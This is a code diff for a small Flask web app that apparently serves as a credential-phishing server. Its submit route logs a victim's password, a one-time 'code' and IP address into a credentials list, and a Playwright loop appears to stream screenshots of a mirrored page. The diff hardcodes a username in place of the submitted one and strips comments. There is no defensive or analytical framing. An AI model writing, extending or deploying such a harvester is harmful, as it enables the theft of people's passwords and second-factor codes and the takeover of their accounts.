@@ -8,11 +8,10 @@ app = Flask(__name__)
 STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
 TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
 os.makedirs(STATIC_DIR, exist_ok=True)
-
-# Ensure Flask knows where templates are
 app.template_folder = TEMPLATE_DIR
 
 creds_log = []
+HARDCODED_USER = "zexoghaith"
 
 def screenshot_loop():
     try:
@@ -32,7 +31,6 @@ def screenshot_loop():
                 time.sleep(1)
     except Exception as e:
         print(f"playwright init failed: {e}")
-        # Create a placeholder so the image route doesn't 404
         try:
             from PIL import Image
             img = Image.new('RGB', (1280, 720), color='black')
@@ -48,7 +46,7 @@ def index():
 def submit():
     data = request.get_json()
     entry = {
-        'user': data.get('username'),
+        'user': HARDCODED_USER,
         'pass': data.get('password'),
         'code': data.get('code'),
         'ip': request.remote_addr,
